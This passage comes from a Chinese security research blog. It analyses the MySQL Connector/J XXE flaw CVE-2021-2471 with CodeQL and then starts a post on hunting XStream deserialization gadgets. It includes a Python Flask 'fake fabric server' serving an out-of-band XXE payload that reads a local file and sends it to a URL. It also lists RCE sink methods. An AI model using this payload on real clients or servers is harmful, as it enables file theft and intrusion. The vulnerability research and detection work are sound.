   &#125; <span class="keyword">catch</span> (XMLStreamException ex) &#123;</span><br><span class="line">            SQLException sqlEx = SQLError.createSQLException(ex.getMessage(), MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, ex, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">            <span class="keyword">throw</span> sqlEx;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> SQLError.createSQLException(Messages.getString(<span class="string">&quot;MysqlSQLXML.2&quot;</span>, <span class="keyword">new</span> Object[] &#123; clazz.toString() &#125;),</span><br><span class="line">                MysqlErrorNumbers.SQL_STATE_ILLEGAL_ARGUMENT, <span class="keyword">this</span>.exceptionInterceptor);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显的XXE了（StAXSource不能利用）</p><p>POC用thread3am是否的，见参考【5】</p><p>调用栈如下，也比较简单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parse:327, DocumentBuilderImpl (com.sun.org.apache.xerces.internal.jaxp)</span><br><span class="line">getSource:225, MysqlSQLXML (com.mysql.cj.jdbc)</span><br><span class="line">main:33, OracleJDBC (com.m0d9.sec.jdbc.mssql)</span><br></pre></td></tr></table></figure><h3 id="Fabric-XXE"><a href="#Fabric-XXE" class="headerlink" title="Fabric XXE"></a>Fabric XXE</h3><p>漏洞触发代码在 com.mysql.fabric.xmlrpc.Client#execute</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> MethodResponse <span class="title">execute</span><span class="params">(MethodCall methodCall)</span> <span class="keyword">throws</span> IOException, ParserConfigurationException, SAXException, MySQLFabricException </span>&#123;</span><br><span class="line">    HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      connection = (HttpURLConnection)<span class="keyword">this</span>.url.openConnection();</span><br><span class="line">      connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">      connection.setRequestProperty(<span class="string">&quot;User-Agent&quot;</span>, <span class="string">&quot;MySQL XML-RPC&quot;</span>);</span><br><span class="line">      connection.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/xml&quot;</span>);</span><br><span class="line">      connection.setUseCaches(<span class="keyword">false</span>);</span><br><span class="line">      connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">      connection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : <span class="keyword">this</span>.headers.entrySet()) &#123;</span><br><span class="line">        connection.setRequestProperty((String)entry.getKey(), (String)entry.getValue());</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      String out = methodCall.toString();</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      OutputStream os = connection.getOutputStream();</span><br><span class="line">      os.write(out.getBytes());</span><br><span class="line">      os.flush();</span><br><span class="line">      os.close();</span><br><span class="line"></span><br><span class="line">      </span><br><span class="line">      InputStream is = connection.getInputStream();</span><br><span class="line">      SAXParserFactory factory = SAXParserFactory.newInstance();</span><br><span class="line">      SAXParser parser = factory.newSAXParser();</span><br><span class="line">      ResponseParser saxp = <span class="keyword">new</span> ResponseParser();</span><br><span class="line">      </span><br><span class="line">      parser.parse(is, saxp);</span><br><span class="line">      </span><br><span class="line">      is.close();</span><br><span class="line">      </span><br><span class="line">      MethodResponse resp = saxp.getMethodResponse();</span><br><span class="line">      <span class="keyword">if</span> (resp.getFault() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> MySQLFabricException(resp.getFault());</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>原理逻辑pyn3rd 师傅PPT给出来了，fake mysql fabric server 代码也给出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/xxe.dtd&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xxe_oob</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;!ENTITY % aaaa SYSTEM &quot;fiLe:///tmp/data&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % demo &quot;&lt;!ENTITY bbbb SYSTEM</span></span><br><span class="line"><span class="string">&#x27;http://127,0.0.1:5000/xxe?data=%aaaa;&#x27;&gt;&quot;&gt; %demo;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dtd</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % xd SYSTEM &quot;http://127.0.0.1:5000/xxe.dtd&quot;&gt; %xd;]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;&amp;bbbb;&lt;/root&gt;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>调用栈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">execute:91, Client (com.mysql.fabric.xmlrpc)</span><br><span class="line">call:113, InternalXmlRpcMethodCaller (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">errorSafeCallMethod:151, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">getServerGroups:200, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">getServerGroups:220, XmlRpcClient (com.mysql.fabric.proto.xmlrpc)</span><br><span class="line">refreshState:71, FabricConnection (com.mysql.fabric)</span><br><span class="line">&lt;init&gt;:46, FabricConnection (com.mysql.fabric)</span><br><span class="line">&lt;init&gt;:203, FabricMySQLConnectionProxy (com.mysql.fabric.jdbc)</span><br><span class="line">&lt;init&gt;:93, JDBC4FabricMySQLConnectionProxy (com.mysql.fabric.jdbc)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (jdk.internal.reflect)</span><br><span class="line">newInstance:488, Constructor (java.lang.reflect)</span><br><span class="line">handleNewInstance:425, Util (com.mysql.jdbc)</span><br><span class="line">connect:78, FabricMySQLDriver (com.mysql.fabric.jdbc)</span><br><span class="line">getConnection:677, DriverManager (java.sql)</span><br><span class="line">getConnection:251, DriverManager (java.sql)</span><br></pre></td></tr></table></figure><h2 id="CodeQL-with-Mysql-XXE"><a href="#CodeQL-with-Mysql-XXE" class="headerlink" title="CodeQL with Mysql XXE"></a>CodeQL with Mysql XXE</h2><p>5.*的需要安装jdk5，比较麻烦，这里以8.0.26为例</p><h3 id="Build-Mysql-QL-DB"><a href="#Build-Mysql-QL-DB" class="headerlink" title="Build Mysql QL DB"></a>Build Mysql QL DB</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># download mysql-connector-j</span></span><br><span class="line">wget https://github.com/mysql/mysql-connector-j/archive/refs/tags/8.0.25.tar.gz -O mysql-connector-j-8.0.25.tar.gz</span><br><span class="line">tar -xzvf mysql-connector-j-8.0.25.tar.gz &amp;&amp; <span class="built_in">cd</span> mysql-connector-j-8.0.25</span><br><span class="line"></span><br><span class="line">mkdir lib &amp;&amp; <span class="built_in">cd</span> lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># download ant build libs</span></span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/jupiter/junit-jupiter-api/5.6.2/junit-jupiter-api-5.6.2.jar -O junit-jupiter-api-5.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/jupiter/junit-jupiter-engine/5.6.2/junit-jupiter-engine-5.6.2.jar -O junit-jupiter-engine-5.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-commons/1.6.2/junit-platform-commons-1.6.2.jar -O junit-platform-commons-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-engine/1.6.2/junit-platform-engine-1.6.2.jar -O junit-platform-engine-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/junit/platform/junit-platform-launcher/1.6.2/junit-platform-launcher-1.6.2.jar -O junit-platform-launcher-1.6.2.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/apiguardian/apiguardian-api/1.1.0/apiguardian-api-1.1.0.jar -O apiguardian-api-1.1.0.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/opentest4j/opentest4j/1.2.0/opentest4j-1.2.0.jar -O opentest4j-1.2.0.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/javassist/javassist/3.27.0-GA/javassist-3.27.0-GA.jar -O javassist-3.27.0-GA.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=com/google/protobuf/protobuf-java/3.11.4/protobuf-java-3.11.4.jar -O protobuf-java-3.11.4.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=com/mchange/c3p0/0.9.5.5/c3p0-0.9.5.5.jar -O c3p0-0.9.5.5.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/slf4j/slf4j-api/1.7.30/slf4j-api-1.7.30.jar -O slf4j-api-1.7.30.jar</span><br><span class="line">wget https://search.maven.org/remotecontent?filepath=org/hamcrest/hamcrest/2.2/hamcrest-2.2.jar -O hamcrest-2.2.jar</span><br><span class="line"></span><br><span class="line"><span class="comment"># build.properties</span></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">cat &lt;&lt; EOF &gt; build.properties</span><br><span class="line">com.mysql.cj.build.jdk=<span class="variable">$JAVA_HOME</span></span><br><span class="line">com.mysql.cj.extra.libs=./lib</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line"><span class="comment"># codeql build</span></span><br><span class="line">codeql database create mysql-qldb -l java --<span class="built_in">command</span>=<span class="string">&quot;ant dist&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Run-QL-Search"><a href="#Run-QL-Search" class="headerlink" title="Run QL Search"></a>Run QL Search</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@name</span> MySQL JDBC XXE</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span> mysql jdbc xxe.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@problem</span>.severity error</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@precision</span> high</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@id</span> java/xxe</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@tags</span> security</span></span><br><span class="line"><span class="comment"> *       external/cwe/cwe-611</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.security.XmlParsers</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.TaintTracking2</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.frameworks.Jdbc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">MySQLJdbcSource</span> <span class="keyword">extends</span> <span class="title">RemoteFlowSource</span> </span>&#123;</span><br><span class="line">  MySQLJdbcSource()&#123;</span><br><span class="line">    exists(MethodAccess m | m = <span class="keyword">this</span>.asExpr() |</span><br><span class="line">      (m.getMethod().getDeclaringType*().hasQualifiedName(<span class="string">&quot;com.mysql.cj.protocol.a&quot;</span>, <span class="string">&quot;SimplePacketReader&quot;</span>)</span><br><span class="line">        and (m.getMethod().hasName(<span class="string">&quot;readMessage&quot;</span>) or m.getMethod().hasName(<span class="string">&quot;readHeader&quot;</span>))</span><br><span class="line">      )</span><br><span class="line">      or </span><br><span class="line">      (m.getMethod().getDeclaringType*().hasQualifiedName(<span class="string">&quot;com.mysql.cj.jdbc.result&quot;</span>, <span class="string">&quot;ResultSetImpl&quot;</span>) </span><br><span class="line">        and (m.getMethod().getName().substring(<span class="number">0</span>, <span class="number">3</span>) = <span class="string">&quot;get&quot;</span>)</span><br><span class="line">      )</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function">override string <span class="title">getSourceType</span><span class="params">()</span> </span>&#123; result = <span class="string">&quot;jdbc&quot;</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">class SafeSAXSourceFlowConfig extends TaintTracking2::Configuration &#123;</span><br><span class="line">  SafeSAXSourceFlowConfig() &#123; <span class="keyword">this</span> = <span class="string">&quot;XmlParsers::SafeSAXSourceFlowConfig&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node src)</span> </span>&#123; src.asExpr() <span class="keyword">instanceof</span> SafeSAXSource &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123;</span><br><span class="line">    sink.asExpr() = any(XmlParserCall parse).getSink()</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override <span class="keyword">int</span> <span class="title">fieldFlowBranchLimit</span><span class="params">()</span> </span>&#123; result = <span class="number">0</span> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class UnsafeXxeSink extends DataFlow::ExprNode &#123;</span><br><span class="line">  UnsafeXxeSink() &#123;</span><br><span class="line">    <span class="function">not <span class="title">exists</span><span class="params">(SafeSAXSourceFlowConfig safeSource | safeSource.hasFlowTo(<span class="keyword">this</span>)</span>) and</span></span><br><span class="line"><span class="function">    <span class="title">exists</span><span class="params">(XmlParserCall parse |</span></span></span><br><span class="line"><span class="function"><span class="params">      parse.getSink()</span> </span>= <span class="keyword">this</span>.getExpr() and</span><br><span class="line">      not parse.isSafe()</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class XxeConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">  XxeConfig() &#123; <span class="keyword">this</span> = <span class="string">&quot;XXE.ql::XxeConfig&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSource</span><span class="params">(DataFlow::Node src)</span> </span>&#123; src <span class="keyword">instanceof</span> RemoteFlowSource &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function">override predicate <span class="title">isSink</span><span class="params">(DataFlow::Node sink)</span> </span>&#123; sink <span class="keyword">instanceof</span> UnsafeXxeSink &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from DataFlow::PathNode source, DataFlow::PathNode sink, XxeConfig conf</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, <span class="string">&quot;Unsafe parsing of XML file from $@.&quot;</span>, source.getNode(),</span><br><span class="line">  <span class="string">&quot;user input&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/pasted-181.png" alt="upload successful"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Postgresql很早就有XXE CVE，横向思维是个好东西，可惜还是不够不能主动发现😭</p><p>CodeQL是个好东西，在构建调用图的基础上，有一套解释型语言来进行搜索，比neo4j要方便很多。值得深入学习，本篇算是记录CodeQL学习的入门篇，期待。。。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://paper.seebug.org/1324/">使用 CodeQL 分析闭源 Java 程序</a></li><li>[2] <a href="https://github.com/github/codeql/issues/4304">can codeql analyse java rt.jar source code? #4304</a></li><li>[3] <a href="https://dev.mysql.com/doc/connector-j/8.0/en/connector-j-installing-source.html">SQL Connector/J 8.0 Developer Guide  /  Connector/J Installation  /  Installing from Source</a></li><li>[4] <a href="https://codeql.github.com/codeql-query-help/java/">CodeQL query help for Java</a></li><li>[5] <a href="https://github.com/SecCoder-Security-Lab/jdbc-sqlxml-xxe">SecCoder-Security-Lab/jdbc-sqlxml-xxe </a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;pyn3rd师傅的《Make JDBC Attack Brilliant Again》中有一个0day是mysql jdbc xxe，thread3am师傅也早就复现出来了，而且还发现了h2的xxe。膜一个，师傅们都太🐂🍺了。很多师傅们也复现了，再讲也没啥意思了，用CodeQL整点新的吧。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;CVE-2021-2471 mysql jdbc xxe在HITB ppt里面，没有讲DOMSource XXE这一部分，原因应该是pyn3rd师傅提漏洞还未公开，没写在ppt里面。所以这个洞有两个东西：&lt;/p&gt;
&lt;p&gt; a. DOMSource XXE, 影响所有版本，官方8.0.27中修复掉了&lt;/p&gt;
&lt;p&gt; b. Fabric XXE, 影响5.x, 在5.1.49中修复&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;CodeQL CWE-611有XXE的检测poc，不过source源不支持mysql。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&quot;CVE-2021-2471&quot;&gt;&lt;a href=&quot;#CVE-2021-2471&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-2471&quot;&gt;&lt;/a&gt;CVE-2021-2471&lt;/h2&gt;&lt;h3 id=&quot;DOMSource-XXE&quot;&gt;&lt;a href=&quot;#DOMSource-XXE&quot; class=&quot;headerlink&quot; title=&quot;DOMSource XXE&quot;&gt;&lt;/a&gt;DOMSource XXE&lt;/h3&gt;&lt;p&gt;漏洞代码在 com.mysql.cj.jdbc.MysqlSQLXML#getSource&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="Mysql" scheme="http://m0d9.me/tags/Mysql/"/>
    
    <category term="XXE" scheme="http://m0d9.me/tags/XXE/"/>
    
    <category term="Fabric" scheme="http://m0d9.me/tags/Fabric/"/>
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
  </entry>
  
  <entry>
    <title>XStream反序列化（三）——Tabby CVE之旅</title>
    <link href="http://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/"/>
    <id>http://m0d9.me/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/</id>
    <published>2021-08-29T09:03:00.000Z</published>
    <updated>2022-03-28T03:33:41.126Z</updated>
    
    <content type="html"><![CDATA[<p>月底在即，再不写点东西，每月一篇都要食言了。上个月刚挖的OpenRASP的坑，本打算再研究研究绕过姿势，验证下猜想，也没下文。正好6月份交的XStream SSRF Gadget CVE下来，之前XStream系列草稿箱里也待着之前逆向分析师傅们挖掘的思路&amp;手法，正好编辑编辑，水一篇”如何挖掘XStream Gadgets”。</p><p>首先感谢Wh1t3p1g师傅的Tabby，用起来比gadgetinspector更顺手，找链神器。</p><h2 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h2><p>有关Tabby的介绍，详情可以参考【1】中Wh1t3p1g师傅的几个wiki，写的很详细了，这里也不多啰嗦。（这里膜一下Wh1t3p1g师傅）</p><p>Neo4j 查询比较吃cpu，小本本加上idea同时跑吃力，搞台vps跑比较好，但是tabby是通过apoc.load.csv file写Neo4j数据的，相当于限制了本机，因此给下整库的dump和load（当然，直接整个在vps上操作也是ok的）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump neo4j database</span></span><br><span class="line">neo4j-admin dump --to /tmp/neo4j.dump --database neo4j</span><br><span class="line"><span class="comment"># scp dump file to vps</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load neo4j dump file</span></span><br><span class="line">./bin/neo4j stop</span><br><span class="line">./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force</span><br><span class="line">./bin/neo4j start</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Gadgets结构"><a href="#Gadgets结构" class="headerlink" title="Gadgets结构"></a>Gadgets结构</h2><p>前文的众多的RCE Gadgets分析中发现Gadgets的结构大致分为：</p><p><strong>Bullet：</strong><br>实现最终的RCE</p><p>rce:</p><ol><li>ProcessBuilder.start() 无参数</li><li>Runtime.getRuntime().exec(cmd) 有参</li><li>JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) 无参</li><li>MethodClosure.call() 无参</li></ol><p>ssrf:</p><ol><li>java.net.URL#openConnection</li></ol><p><strong>核心中间链</strong><br>中间链是整个寻找Gadgets的核心，简单的可能没有中间链，复杂的可能会组合使用</p><ol><li>invoke 实现上有问题的 InvokeHandler，如<ul><li>EventHandler</li><li>搭配MethodClosure的ConvertedClosure</li></ul></li><li>hashCode、compare、equal实现有问题的Map/Set/Queue，如<ul><li>Expando，hashCode搭配MethodClosure可以RCE</li><li>CVE-2021-21345 ServerTableEntry verify方法可RCE</li></ul></li><li>存在invoke，且method、obj可控的class（这一类普遍存在）<ul><li>CVE-2020-26217 ImageIO$ContainsFilter，filter方法内可控</li><li>CVE-2021-21344 Accessor$GetterSetterReflection，get方法可控</li><li>CVE-2021-21351 IncrementalSAXSource_Xerces parseSome方法内invoke可控</li></ul></li><li>利用ClassLoader实例化<ul><li>ServiceLoader$LazyIterator，调用点为Class.forName (name,initialize,loader) ，指定loader为BCEL classLoaer</li><li>CVE-2021-21347，调用点为loader.loadClass(name).newInstance()，利用java.net.URLClassLoader加载远程jar类并实例化</li><li>CVE-2021-21350，和LazyIterator一样，利用BCEL classLoader</li></ul></li></ol><p><strong>Trigger：</strong><br>类似扳机的作用？整个链的起点</p><ol><li>MapConverter/TreeSetConveter/TreeMapConveter都会触发这些集合/表 内元素的内部函数，比如compare、hashCode、equals这些函数。<ul><li>MapConverter类型put对象时调用该对象的hashCode、equals、toString方法</li><li>TreeSet调用put对象时调用该对象的compareTo方法</li><li>PriorityQueue触发comparator属性中compare方法</li></ul></li><li>DynamicProxyConverter 代理类，InvocationHandler可控，导致一些invoke存在RCE风险的InvocationHandler类，如EventHandler，可以加以利用。</li></ol><h2 id="CVEs"><a href="#CVEs" class="headerlink" title="CVEs"></a>CVEs</h2><p>在了解了neo4j &amp; tabby &amp; Gadges组成 的基础上，那就让我们尝试使用Tabby的挖掘XStream Gadgets。精力有限，以以下几个CVE为例（难易程度排序）</p><ul><li>CVE-2021-21342 </li><li>CVE-2021-39152</li><li>CVE-2021-21351</li><li>CVE-2021-21346</li><li>CVE-2021-21347/21350</li><li>CVE-2020-26217</li><li>CVE-2021-21344/21345</li></ul><h3 id="CVE-2021-21342"><a href="#CVE-2021-21342" class="headerlink" title="CVE-2021-21342"></a>CVE-2021-21342</h3><h4 id="寻找Bullet"><a href="#寻找Bullet" class="headerlink" title="寻找Bullet"></a>寻找Bullet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.net.URL#openConnection</span><br></pre></td></tr></table></figure><h4 id="寻找中间链"><a href="#寻找中间链" class="headerlink" title="寻找中间链"></a>寻找中间链</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;m0d9 xstream URLDNS</span><br><span class="line">match 